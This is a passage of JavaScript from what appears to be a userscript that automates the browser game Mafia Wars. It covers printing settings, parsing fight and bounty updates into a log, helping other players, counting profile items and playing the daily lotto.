        'Energy threshold: <strong>' + GM_getValue('selectEnergyUse') + ' ' + numberSchemes[GM_getValue('selectEnergyUseMode', 0)] + ' (refill to ' + SpendEnergy.ceiling + ')</strong><br>' +
        '&nbsp;&nbsp;-Energy use started: <strong>' + GM_getValue('useEnergyStarted') + '</strong><br>' +
        'Energy reserve: <strong>' + + GM_getValue('selectEnergyKeep') + ' ' + numberSchemes[GM_getValue('selectEnergyKeepMode', 0)] + ' (keep above ' + SpendEnergy.floor + ')</strong><br>' +
        'autoEnergyPackForce: <strong>' + showIfUnchecked(GM_getValue('autoEnergyPackForce')) + '</strong><br>' +
        '&nbsp;&nbsp;-autoEnergyPackForcePts: <strong>' + GM_getValue('autoEnergyPackForcePts') + '</strong><br>' +
        '-------------------Stamina Tab-------------------<br>' +
        'Spend stamina: <strong>' + showIfUnchecked(GM_getValue('staminaSpend')) + '</strong><br>' +
        'How: <strong>' + staminaSpendChoices[GM_getValue('staminaSpendHow', 0)] + '</strong><br>' +
        //'Fight till Iced then Rob?: <strong>' + showIfUnchecked(GM_getValue('fightrob')) + '</strong><br>' +
        'Hide Finished Collection Items: <strong>' + showIfUnchecked(GM_getValue('HideCollections')) + '</strong><br>' +
        '&nbsp;&nbsp;Skip iced targets: <strong>' + showIfUnchecked(GM_getValue('iceCheck')) + '</strong><br>' +
        'Enabled stamina bursts: <strong>' + showIfUnchecked(GM_getValue('burstStamina')) + ' == Burn ' + GM_getValue('burstPoints') + ' points ' + burstModes[GM_getValue('burstMode')] + '</strong><br>' +
        '&nbsp;&nbsp;-Fight in: <strong>' + fightLocations[GM_getValue('fightLocation', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;-Reattack <strong>' + showIfUnchecked(GM_getValue('staminaReattack')) + '</strong><br>' +
        '&nbsp;&nbsp;-Reattack threshold:<strong>' + GM_getValue('reattackThreshold') + '</strong><br>' +
        '&nbsp;&nbsp;-Powerattack <strong>' + showIfUnchecked(GM_getValue('staminaPowerattack')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight max level: <strong>' + GM_getValue('fightLevelMax') + ' (' + showIfRelative('fightLevelMaxRelative') + ')</strong><br>' +
        '&nbsp;&nbsp;-Random fight max mafia: <strong>' + GM_getValue('fightMafiaMax') + ' (' + showIfRelative('fightMafiaMaxRelative') + ')</strong><br>' +
        '&nbsp;&nbsp;-Random fight min mafia: <strong>' + GM_getValue('fightMafiaMin') + ' (' + showIfRelative('fightMafiaMinRelative') + ')</strong><br>' +
        '&nbsp;&nbsp;-Random fight stealth: <strong>' + showIfUnchecked(GM_getValue('fightStealth')) + '</strong><br>' +
        //'&nbsp;&nbsp;-Random fight avoid bodyguards: <strong>' + showIfUnchecked(GM_getValue('fightAvoidBodyguards')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight use Patterns: <strong>' + showIfUnchecked(GM_getValue('fightNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight avoid names: <strong>' + showIfUnchecked(GM_getValue('fightAvoidNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Random fight specific names: <strong>' + showIfUnchecked(GM_getValue('fightOnlyNames')) + '</strong><br>' +
        'Families list: <strong>' + GM_getValue('fightClanName') + '</strong><br>' +
        '&nbsp;&nbsp;-List fight opponents: <strong>' + GM_getValue('fightList') + '</strong><br>' +
        '&nbsp;&nbsp;-List fight remove stronger: <strong>' + showIfUnchecked(GM_getValue('fightRemoveStronger')) + '</strong><br>' +
        '&nbsp;&nbsp;-Collect hitman bounties in: <strong>' + locations[GM_getValue('hitmanLocation', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman min bounty: <strong>' + parseCash(GM_getValue('hitmanBountyMin')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman bounty selection: <strong>' + bountySelectionChoices[(GM_getValue('bountySelection'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman use Patterns: <strong>' + showIfUnchecked(GM_getValue('hitmanNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman avoid names: <strong>' + showIfUnchecked(GM_getValue('hitmanAvoidNames')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hitman specific names: <strong>' + showIfUnchecked(GM_getValue('hitmanOnlyNames')) + '</strong><br>' +
        'Families list: <strong>' + GM_getValue('hitmanClanName') + '</strong><br>' +
        '&nbsp;&nbsp;-Rob in: <strong>' + locations[GM_getValue('robLocation', NY)] + '</strong><br>' +
        '&nbsp;&nbsp;-AutoHit bounty: <strong>' + parseCash(GM_getValue('autoHitListBounty')) + '</strong><br>' +
        '&nbsp;&nbsp;-Set Bounties in: <strong>' + locations[GM_getValue('autoHitListLoc', 0)] + '</strong><br>' +
        '&nbsp;&nbsp;-Random <strong>' + showIfUnchecked(GM_getValue('autoHitListRandom')) + '</strong><br>' +
        '&nbsp;&nbsp;-AutoHit opponents: <strong>' + GM_getValue('autoHitOpponentList') + '</strong><br>' +
        '&nbsp;&nbsp;-AutoHit background: <strong>' + showIfUnchecked(GM_getValue('bgAutoHitCheck')) + '</strong><br>' +
        //'&nbsp;&nbsp;-Random Stam Spend - Stamina Spend Modes: <strong>' + GM_getValue('randomSpendModes') + '</strong><br>' +
        '&nbsp;&nbsp;-Random Stam Spend - Fight in: <strong>' + GM_getValue('randomFightLocations') + '</strong><br>' +
        '&nbsp;&nbsp;-Random Stam Spend - Rob in: <strong>' + GM_getValue('randomRobLocations') + '</strong><br>' +
        '&nbsp;&nbsp;-Random Stam Spend - Hit in: <strong>' + GM_getValue('randomHitmanLocations') + '</strong><br>' +
        'Stamina threshold: <strong>' + GM_getValue('selectStaminaUse') + ' ' + numberSchemes[GM_getValue('selectStaminaUseMode', 0)] + ' (refill to ' + SpendStamina.ceiling + ')</strong><br>' +
        '&nbsp;&nbsp;-Stamina use started: <strong>' + GM_getValue('useStaminaStarted') + '</strong><br>' +
        'Stamina reserve: <strong>' + + GM_getValue('selectStaminaKeep') + ' ' + numberSchemes[GM_getValue('selectStaminaKeepMode', 0)] + ' (keep above ' + SpendStamina.floor + ')</strong><br>' +
        'Ignore reserve to level-up: <strong>' + showIfUnchecked(GM_getValue('allowStaminaToLevelUp')) + '</strong><br>' +
        '------------------Health Tab-------------------<br>' +
        'Enable auto-heal: <strong>' + showIfUnchecked(GM_getValue('autoHeal')) + '</strong><br>' +
        '&nbsp;&nbsp;-Heal in : <strong>' + locations[GM_getValue('healLocation')] + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum health: <strong>' + GM_getValue('healthLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Use quickheal: <strong>' + showIfUnchecked(GM_getValue('quickHeal')) + '</strong><br>' +
        '&nbsp;&nbsp;-Attack at critical health: <strong>' + showIfUnchecked(GM_getValue('attackCritical')) + '</strong><br>' +
        '&nbsp;&nbsp;-Hide in Hospital: <strong>' + showIfUnchecked(GM_getValue('hideInHospital')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal if health is above 19: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt7')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal after 5 minutes: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt5')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal when stamina is full: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt4')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Heal when stamina can be spent: <strong>' + showIfUnchecked(GM_getValue('forceHealOpt3')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;-Minimum Stamina Allowing auto-Heal: <strong>' + GM_getValue('stamina_min_heal') + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;block auto-Heal while robbing: <strong>' + GM_getValue('BlockHealRobbing') + '</strong><br>' +
        'Hitlist riding: <strong>' + showIfUnchecked(GM_getValue('hideAttacks')) + '</strong><br>' +
        '&nbsp;&nbsp;Hitlist riding XP limit: <strong>' + GM_getValue('rideHitlistXP') + '</strong><br>' +
        'Stop PA: <strong>' + showIfUnchecked(GM_getValue('stopPA')) + '</strong><br>' +
        '&nbsp;&nbsp;when health falls below: <strong>' + GM_getValue('stopPAHealth') + '</strong><br>' +
        'Stop Bursts: <strong>' + showIfUnchecked(GM_getValue('stopBursts')) + '</strong><br>' +
        '&nbsp;&nbsp;when health falls below: <strong>' + GM_getValue('stopBurstsHealth') + '</strong><br>' +
        '------------------Cash Tab-------------------<br>' +
        'Enable auto-upgrade <strong>' + showIfUnchecked(GM_getValue('autoBuy')) + '</strong><br>' +
        '&nbsp;&nbsp;-Min cash (NY): <strong>' + GM_getValue('minCashNew York') + '</strong><br>' +
        '&nbsp;&nbsp;-Min cash (Cuba): <strong>' + GM_getValue('minCashCuba') + '</strong><br>' +
        '&nbsp;&nbsp;-Min cash (Moscow): <strong>' + GM_getValue('minCashMoscow') + '</strong><br>' +
        '&nbsp;&nbsp;-Min cash (Bangkok): <strong>' + GM_getValue('minCashBangkok') + '</strong><br>' +
        'Collect NY Take: <strong>' + showIfUnchecked(GM_getValue('collectTakeNew York')) + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at:' + GM_getValue('takeHourNew York', 0) + '</strong><br>' +
        'Collect Cuba Take: <strong>' + showIfUnchecked(GM_getValue('collectTakeCuba')) + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at:' + GM_getValue('takeHourCuba', 0) + '</strong><br>' +
        'Collect Moscow Take: <strong>' + showIfUnchecked(GM_getValue('collectTakeMoscow')) + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at:' + GM_getValue('takeHourMoscow', 0) + '</strong><br>' +
        'Collect Bangkok Take: <strong>' + showIfUnchecked(GM_getValue('collectTakeBangkok')) + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at:' + GM_getValue('takeHourBangkok', 0) + '</strong><br>' +
        'Collect Vegas Take: <strong>' + showIfUnchecked(GM_getValue('collectTakeLas Vegas')) + '</strong><br>' +
        '&nbsp;&nbsp;-Next take at:' + GM_getValue('takeHourLas Vegas', 0) + '</strong><br>' +
        'Build Cars: <strong>' + showIfUnchecked(GM_getValue('buildCar')) + '</strong><br>' +
        '&nbsp;&nbsp;Car Type: <strong>' + cityCars[GM_getValue('buildCarId', 9)][0] + '</strong><br>' +
        'Build Weapongs: <strong>' + showIfUnchecked(GM_getValue('buildWeapon')) + '</strong><br>' +
        '&nbsp;&nbsp;Weapon Type: <strong>' + cityWeapons[GM_getValue('buildWeaponId', 9)][0] + '</strong><br>' +
        'Enable auto-bank in NY: <strong>' + showIfUnchecked(GM_getValue('autoBank')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: $<strong>' + GM_getValue('bankConfig') + '</strong><br>' +
        'Enable auto-bank in Cuba: <strong>' + showIfUnchecked(GM_getValue('autoBankCuba')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: C$<strong>' + GM_getValue('bankConfigCuba') + '</strong><br>' +
        'Enable auto-bank in Moscow: <strong>' + showIfUnchecked(GM_getValue('autoBankMoscow')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: R$<strong>' + GM_getValue('bankConfigMoscow') + '</strong><br>' +
        'Enable auto-bank in Bangkok: <strong>' + showIfUnchecked(GM_getValue('autoBankBangkok')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: B$<strong>' + GM_getValue('bankConfigBangkok') + '</strong><br>' +
        'Enable auto-bank in Vegas: <strong>' + showIfUnchecked(GM_getValue('autoBankVegas')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: V$<strong>' + GM_getValue('bankConfigVegas') + '</strong><br>' +
        '&nbsp;&nbsp;-Vault Level: <strong>' + GM_getValue('vaultHandling') + '</strong><br>' +
        '&nbsp;&nbsp;-Free vault space: V$<strong>' + makeCommaValue(GM_getValue('vaultSpace')) + '</strong><br>' +
        '------------------About Tab-------------------<br>' +
        'Testing New Script Updates: <strong>'+ showIfUnchecked(GM_getValue('TestChanges')) + '</strong><br>' +
        '>  >  >  >  >  END SETTINGS DUMP  <  <  <  <  <');
}

// This function returns false if some further action has been taken and the
// caller should not make additional calls until that action has completed.
function parsePlayerUpdates(messagebox) {
  // Get the timestamp (e.g. "3 minutes ago")
  var minutesAgo = xpathFirst('.//div[@class="update_timestamp"]', messagebox);
  minutesAgo = minutesAgo? minutesAgo.innerHTML + ' ' : '';
  minutesAgo = minutesAgo.indexOf('0') == 0? '' : minutesAgo;

  // Get the text and links.
  var messageTextElt = xpathFirst('.//div[@class="update_txt"]', messagebox);
  if (!messageTextElt) {
    addToLog('warning Icon', 'BUG DETECTED: Unable to read update text.');
    return true;
  }
  var messageText = messageTextElt.innerHTML;
  var messageTextNoTags = messageText.untag();
  var links = messageTextElt.getElementsByTagName('a');
  var cost, user, result, userElt, elt, hitman;

  DEBUG(messageTextNoTags);

  if (messageTextNoTags.indexOf('attacked by') != -1) {
     var attackCount = 1;
    // Attacked by some fool with a death wish.
    user = linkToString(links[0], 'user');
    result = 'Attacked';
    if (links[0] && links[0].nextSibling && links[0].nextSibling.nodeValue &&
        links[0].nextSibling.nodeValue.match(/(\d+) times/i)) {
      attackCount = parseInt( RegExp.$1);
      result += ' ' + RegExp.lastMatch;
    }
    result += ' by ' + user;

    var needStatUpdate = false;
    if (messageTextNoTags.match(/you won.*you gained .*?(\d+) experience points?.*?([A-Z]?\$[\d,]*\d)/i)) {
      // The fight was won.
      cost = RegExp.$2;
      var experience = RegExp.$1;
      //result += '<span class="good">' + ' WON ' + cost + '</span>' + ' and ' +
      //          '<span class="good">' + experience +' experience.</span>';

      result += ' and <span class="good">WON</span>, gaining <span class="good">' + cost + '</span> and ' +
        '<span class="good">' + experience + ' experience</span>.';
      var cashLoc = parseCashLoc(cost);
      cost = parseCash(cost);
      experience = parseInt(experience);
      GM_setValue('passivetotalFightExpInt', parseInt(GM_getValue('passivetotalFightExpInt', 0) + experience));
      GM_setValue('passivefightWinCountInt', parseInt(GM_getValue('passivefightWinCountInt', 0) + attackCount));
      needStatUpdate = true;

      if (isGMChecked('hideAttacks')) {
        DEBUG('Riding Hitlist fight won.');
        GM_setValue('currentHitXp', parseInt((GM_getValue('currentHitXp', 0)) + experience));
        GM_setValue('currentHitDollars', String(parseInt(GM_getValue('currentHitDollars', 0)) + cost));
        DEBUG(result);
        if (isGMChecked('autoHeal')) {
          if (GM_getValue('rideHitlistXP', 0) == 0 && experience == 0 && GM_getValue('currentHitXp', 0) > 12) {
            DEBUG('Zero experience detected; turning off auto-heal.<br>(currentHitXp = ' + GM_getValue('currentHitXp', 0) + ')');
            GM_setValue('autoHeal', 0);
          } else if (GM_getValue('rideHitlistXP', 0) > 0 && GM_getValue('currentHitXp', 0) >= GM_getValue('rideHitlistXP', 0)) {
            DEBUG(GM_getValue('currentHitXp', 0) + ' experience accumulated; turning off auto-heal.');
            GM_setValue('autoHeal', 0);
          }
        }
      } else {
        addToLog('updateGood Icon', minutesAgo + result);
      }

//      NEEDS FIX - player updates need their own stats and a place to put them in the log (tabbed log
//      perhaps?)
//      The setValue commands below should not be updating auto-fight stats as it thows off
//      the gain rate, stamina req'd to level and ultimately  the auto-burn stamina for level up action.
//      Leaving in as placeholders. --AK17710N
//
//      GM_setValue('fightWinCountInt', (GM_getValue('fightWinCountInt', 1) + 1));
//      GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + experience);
      if (cost) {
        //GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cost));
        switch (cashLoc) {
          case NY: GM_setValue('passivefightWin$NY', String(parseInt(GM_getValue('passivefightWin$NY', 0)) + cost)); break;
          case CUBA: GM_setValue('passivefightWin$Cuba', String(parseInt(GM_getValue('passivefightWin$Cuba', 0)) + cost)); break;
          case MOSCOW: GM_setValue('passivefightWin$Moscow', String(parseInt(GM_getValue('passivefightWin$Moscow', 0)) + cost)); break;
          case BANGKOK: GM_setValue('passivefightWin$Bangkok', String(parseInt(GM_getValue('passivefightWin$Bangkok', 0)) + cost)); break;
          case LV: GM_setValue('passivefightWin$Vegas', String(parseInt(GM_getValue('passivefightWin$Vegas', 0)) + cost)); break;
        }
        needStatUpdate = true;
      }
    } else if (messageTextNoTags.match(/you lost.*and losing .*?([A-Z]?\$[\d,]*\d)/i)) {
      // The fight was lost.
      cost   = RegExp.$1;
      //result += '<span class="bad">' + ' LOST ' + cost + '.</span>';
      result += ' and <span class="bad">LOST</span>, losing <span class="bad">' + cost + '</span>.';
      var cashLoc = parseCashLoc(cost);
      cost = parseCash(cost);
      GM_setValue('passivefightLossCountInt', GM_getValue('passivefightLossCountInt', 0) + attackCount);
      needStatUpdate = true;

      if (isGMChecked('hideAttacks')) {
        DEBUG('Ride Hitlist fight lost.');
        GM_setValue('currentHitDollars', String(parseInt(GM_getValue('currentHitDollars', 0)) - cost));
        DEBUG(result);
      } else {
        addToLog('updateBad Icon', minutesAgo + result);
      }

//      NEEDS FIX - player updates need their own stats and a place to put them in the log (tabbed log
//      perhaps?)
//      The setValue commands below should not be updating auto-fight stats as it throws off
//      the gain rate, stamina req'd to level and ultimately the auto-burn stamina for level up action.
//      Leaving in as placeholders. --AK17710N
//
//      GM_setValue('fightLossCountInt', (GM_getValue('fightLossCountInt', 1) + 1));
      if (cost) {
        //GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cost));
        switch (cashLoc) {
          case NY: GM_setValue('passivefightLoss$NY', String(parseInt(GM_getValue('passivefightLoss$NY', 0)) + cost)); break;
          case CUBA: GM_setValue('passivefightLoss$Cuba', String(parseInt(GM_getValue('passivefightLoss$Cuba', 0)) + cost)); break;
          case MOSCOW: GM_setValue('passivefightLoss$Moscow', String(parseInt(GM_getValue('passivefightLoss$Moscow', 0)) + cost)); break;
          case BANGKOK: GM_setValue('passivefightLoss$Bangkok', String(parseInt(GM_getValue('passivefightLoss$Bangkok', 0)) + cost)); break;
          case LV: GM_setValue('passivefightLoss$Vegas', String(parseInt(GM_getValue('passivefightLoss$Vegas', 0)) + cost)); break;
        }
        needStatUpdate = true;
      }
    } else {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read update win/loss.');
    }
    if (needStatUpdate) updateLogStats();
  } else if (messageTextNoTags.indexOf('You were snuffed') != -1) {
    // Death. Ouch.
    GM_setValue('snuffCount', parseInt( GM_getValue('snuffCount', 0) + 1));
    needStatUpdate = true;
    addToLog('updateBad Icon', minutesAgo + 'You <span class="bad">' + 'DIED' + '</span>.');

    GM_setValue('passivetotalFightExpInt', parseInt(GM_getValue('passivetotalFightExpInt', 0)) - 6);
  } else if (messageTextNoTags.indexOf('You were knocked out') != -1) {
    // Hitlist ride has ended.
    hitman = linkToString(links[0], 'user');
    user = linkToString(links[1], 'attacker');
    var bounty = parseCash(messageTextNoTags.split(' who claimed the ')[1]);
    result = 'Whacked by '+ hitman + ' who claimed the $' +
             makeCommaValue(parseInt(bounty)) + ' bounty set by ' +
             user + '.';

    GM_setValue('whackedCount', parseInt( GM_getValue('whackedCount', 0) + 1));
    needStatUpdate = true;

    if (isGMChecked('hideAttacks')) {
      DEBUG('Whacked riding hitlist.');
      GM_setValue('currentHitXp', parseInt(GM_getValue('currentHitXp', 0)) - 6);
      GM_setValue('totalHits', parseInt(GM_getValue('totalHits', 0)) + 1);
      GM_setValue('totalXp', parseInt(GM_getValue('totalXp', 0)) + parseInt(GM_getValue('currentHitXp', 0)));
      GM_setValue('lastHitXp', parseInt(GM_getValue('currentHitXp', 0)));
      GM_setValue('totalHitDollars', String(parseInt(GM_getValue('currentHitDollars', 0)) + parseInt(GM_getValue('totalHitDollars', 0))));
      var currentHitXp, currentHitDollars;
      if (GM_getValue('currentHitXp', 0) < 0) {
        currentHitXp = '<span class="bad">LOST ' + GM_getValue('currentHitXp', 0) + '</span>';
      } else {
        currentHitXp = '<span class="good">GAINED ' + GM_getValue('currentHitXp', 0) + '</span>';
      }
      if (parseInt(GM_getValue('currentHitDollars', 0)) < 0) {
        currentHitDollars = '<span class="bad">' +
                                ' LOST $' + makeCommaValue(parseInt(GM_getValue('currentHitDollars', 0))) + '</span>';
        addToLog('updateBad Icon', minutesAgo + currentHitXp + ' experience and ' + currentHitDollars + ' on the hitlist.');
      } else {
        currentHitDollars = '<span class="good">' +
                                ' WON $' + makeCommaValue(parseInt(GM_getValue('currentHitDollars', 0))) + '</span>';
        addToLog('updateGood Icon', minutesAgo + currentHitXp + ' experience and ' + currentHitDollars + ' on the hitlist.');
      }

      DEBUG('Hitlist total values set; now clearing current values.');
      GM_setValue('currentHitXp', 0);
      GM_setValue('currentHitDollars', '0');
      DEBUG('Ensure that autoHeal is enabled.');
      GM_setValue('autoHeal', 'checked');

    }
    addToLog('updateBad Icon', minutesAgo + result);

  } else if (messageTextNoTags.indexOf('You were punched') != -1) {
    // Punched by some wuss.
    user = linkToString(links[0], 'attacker');
    result = 'You were punched in the face by ' + user + '.';
    addToLog('updateBad Icon', minutesAgo + result);

  } else if (messageTextNoTags.indexOf('You fought as') != -1) {
    // Helped a fellow mafia member in a fight.
    var capo = linkToString(links[0], 'user');
    user = linkToString(links[1], 'user');
    cost = messageTextNoTags.match(REGEX_CASH);
    result = 'You fought as ' + capo + "'s Capo and defeated " +
             user + ', receiving ' + '<span class="good">' +
             cost + '</span> for your efforts.';
    addToLog('updateGood Icon', minutesAgo + result);

  } else if (messageTextNoTags.indexOf('needs your help') != -1) {
    if (isGMChecked('autoHelp')) {
      // Help requested by a fellow mafia member.
      userElt = xpathFirst('.//a[contains(@onclick, "controller=stats")]', messagebox);
      elt = xpathFirst('.//a[contains(@href, "give_help")]', messagebox);
      if (elt) {
        // Help immediately.
        Autoplay.fx = function() {
          clickAction = 'help';
          clickContext = {
            user: linkToString(userElt, 'user'),
            help: linkToString(elt)
          };
          clickElement(elt);
          DEBUG('Clicked to help with a job.');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return false;
      } else {
        addToLog('warning Icon', 'BUG DETECTED: Unable to find help element.');
      }
    }

  } else if (messageTextNoTags.indexOf('went to war with') != -1) {
    if (isGMChecked('autoWarHelp')) {
      // War assist requested by a fellow mafia member.
      userElt = xpathFirst('.//a[contains(@onclick, "controller=stats")]', messagebox);
      elt = xpathFirst('.//a[contains(text(), "Help out your friends")]', messagebox);
      if (elt) {
        // Help immediately.
        Autoplay.fx = function() {
          clickContext = {
            user: linkToString(userElt, 'user'),
            help: linkToString(elt)
          };
          clickElement(elt);
          helpWar = true;
          DEBUG('Clicked to help war.');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return false;
      } else {
        addToLog('warning Icon', 'BUG DETECTED: Unable to find war help element.');
      }
    }

  } else if (messageTextNoTags.indexOf('needs more Burners') != -1) {
    if (isGMChecked('autoBurnerHelp')) {
      // Help requested by a fellow mafia member.
      userElt = xpathFirst('.//a[contains(@onclick, "controller=stats")]', messagebox);
      elt = xpathFirst('.//a[contains(@href, "action=call_for_help_get_phone")]', messagebox);
      if (elt) {
        // Help immediately.
        Autoplay.fx = function() {
          clickAction = 'help burners';
          clickContext = {
            user: linkToString(userElt, 'user'),
            help: linkToString(elt)
          };
          clickElement(elt);
          DEBUG('Clicked to help with burners.');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return false;
      } else {
        addToLog('warning Icon', 'BUG DETECTED: Unable to find burner help element.');
      }
    }

  } else if (messageTextNoTags.indexOf('but still needs a few more') != -1) {
    if (isGMChecked('autoPartsHelp')) {
      // Help requested by a fellow mafia member.
      messageTextNoTags.match(/(.*) is close to completing a.*/i);
      var userText = RegExp.$1;
      //userElt = xpathFirst('.//a[contains(@onclick, "controller=stats")]', messagebox);
      elt = xpathFirst('.//a[contains(@href, "action=cs_help_item")]', messagebox);
      if (elt) {
        // Help immediately.
        Autoplay.fx = function() {
          clickAction = 'help parts';
          clickContext = {
            user: userText,
            help: linkToString(elt)
          };
          clickElement(elt);
          DEBUG('Clicked to help with parts.');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return false;
      } else {
        addToLog('warning Icon', 'BUG DETECTED: Unable to find parts help element.');
      }
    }

  } else if (messageTextNoTags.indexOf('claimed your $') != -1) {
    // Bounty claimed. Whoever was hitlisted is sleeping with the fishes.
    hitman = linkToString(links[0], 'user');
    user = linkToString(links[1], 'attacker');
    result = hitman + ' claimed your ' +
             messageTextNoTags.match(REGEX_CASH)[0] +
             ' bounty on ' + user + '.';
    addToLog('updateGood Icon', minutesAgo + result);

  } else if (messageTextNoTags.match(/you earned.*achievement/i)) {
    // You earned an achievement.
    addToLog('updateGood Icon', minutesAgo + messageText);

  } else if (messageTextNoTags.match(/earned some great items/i)) {
    // Social reward, no need to collect. Ignore it.
    DEBUG(minutesAgo + messageText);

  } else if (messageTextNoTags.match(/earned the.*achievement/i)) {
    // Someone else earned an achievement. Who cares!
    DEBUG(minutesAgo + messageText);

  } else if (messageTextNoTags.match(/went to war with youxx/i)) {
    // Someone declared war on us!
    DEBUG(minutesAgo + messageText);

  } else {
    // Just copy the update text straight into the log.
    addToLog('info Icon', minutesAgo + messageText);
  }

  return true;
}

function profileFix() {
  var lists = $x('.//ul[@class="nice_list items_list clearfix"]', innerPageElt);
  if (!lists || lists.length < 4 || xpathFirst('./div[contains(@style,"border") and contains(@style,"padding")]/div[@class="title"]/span', innerPageElt))
    return;

  // Count the number of items in each item list.
  var itemCount = [];
  for (var i = 0; i < 4; i++) {
    itemCount[i] = 0;
    var elts = $x('./li/div[2]', lists[i]);
    for (var j = elts.length - 1; j >= 0; --j) {
      if (elts[j].innerHTML.match(/(\d+)/))
        itemCount[i] += parseInt(RegExp.$1);
    }
  }

  var findItems = xpath('./div[contains(@style,"border") and contains(@style,"padding")]/div[@class="title"]', innerPageElt);
  var greenText = 'color:#52E259;';
  var redText = 'color:#EC2D2D;';
  if (findItems && findItems.snapshotLength >= 3 && findItems.snapshotLength <= 5) {
    for (var locateBlock = 0; locateBlock < findItems.snapshotLength; ++locateBlock) {
      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Weapons') {
        if ((mafia <= itemCount[0]) || (itemCount[0] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode('(' + itemCount[0] + ')'));
      }

      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Armor') {
        if ((mafia <= itemCount[1]) || (itemCount[1] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode(' (' + itemCount[1] + ')'));
      }

      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Vehicles') {
        if ((mafia <= itemCount[2]) || (itemCount[2] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode('(' + itemCount[2] + ')'));
      }

      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Animals') {
        if ((mafia <= itemCount[3]) || (itemCount[3] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode('(' + itemCount[3] + ')'));
      }
    }
  }
}

// Fetch the action message box
function getActionBox(boxDesc) {
  if (!onHome()) return false;
  var boxElt = xpathFirst('.//div[@class="message_box_full_border" and contains(.,"'+boxDesc+'")]', innerPageElt);
  if (boxElt) return boxElt;
  return false;
}

// Fetch the action link for the given message box
function getActionLink(boxDiv, linkText) {
  var linkElt = xpathFirst('.//a[contains(.,"'+linkText+'")]', boxDiv);
  if(!linkElt)linkElt = xpathFirst('.//a//span[contains(.,"'+linkText+'")]', boxDiv);
  if (linkElt) return linkElt;
  return false;
}

function autoLotto() {
  Autoplay.delay = getAutoPlayDelay();

  var actionElt = getActionBox('Daily Chance');
  if (actionElt) {
    // Check if Lotto resuls are out
    var actionLink = getActionLink (actionElt, 'Check Results');
    if (actionLink) {
      Autoplay.fx = function() {
        clickElement(actionLink);
        DEBUG('Clicked to see Daily Chance results.');
      };
      Autoplay.start();
      return true;
    }

    // Check if free ticket is available
    actionLink = getActionLink (actionElt, 'Play Now');
    if (actionLink) {
      Autoplay.fx = function() {
        clickElement(actionLink);
        DEBUG('Clicked to play the daily chance.');
      };
      Autoplay.start();
      return true;
    }
  }

  if (!onLottoNav()) return false;

  var i, j;
  // Go to the daily chance menu
  var eltDailyChance = xpathFirst('//a[contains(.,"Daily Chance")]');
  if (!xpathFirst('//div[@class="minitab_content" and contains(.,"Play")]')) {
    Autoplay.fx = function(){
      if(eltDailyChance){
        clickElement(eltDailyChance);
        DEBUG('Clicked to go to daily chance.');
      }
    };
    Autoplay.start();
    return true;
  }

  // Are we supposed to grab a mastery prize?
  if (isGMChecked('autoLottoBonus')) {
    // Grab the progress status
    var lottoProgress = xpath('.//div/span[contains(@style, "font-size: 20px; font-weight: bold") and contains(text(), " of 6")]', innerPageElt);
    if (lottoProgress.snapshotLength != 0) {
      lottoProgress = lottoProgress.snapshotItem(0).parentNode.innerHTML;

      // This is the prize number
      var lottoPrize = parseInt(lottoProgress.substr(lottoProgress.indexOf(" of 6") - 1, 1));
      DEBUG('Daily Chance Prize = ' + autoLottoBonusList[lottoPrize - 1]);

      // Is the current item the correct one?
      if (lottoPrize == (GM_getValue('autoLottoBonusItem', 0) + 1)) {
        // Grab the mastery button
